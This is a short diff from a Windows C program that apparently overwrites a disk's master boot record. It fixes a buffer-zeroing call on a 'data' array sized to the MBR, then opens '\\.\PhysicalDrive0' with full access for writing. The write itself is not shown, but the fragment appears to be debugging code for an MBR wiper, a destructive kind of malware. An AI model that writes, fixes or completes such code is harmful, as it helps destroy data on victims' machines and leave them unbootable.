@@ -89,7 +89,7 @@ int main(int agrc, char *argv[])
     DWORD write;
     char data[MBR];
     // Initialize the data buffer to zero
-    tozero(&mbr, MBR);
+    tozero(&data, MBR);
 
     // Open the physical disk for writing
     HANDLE Target = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
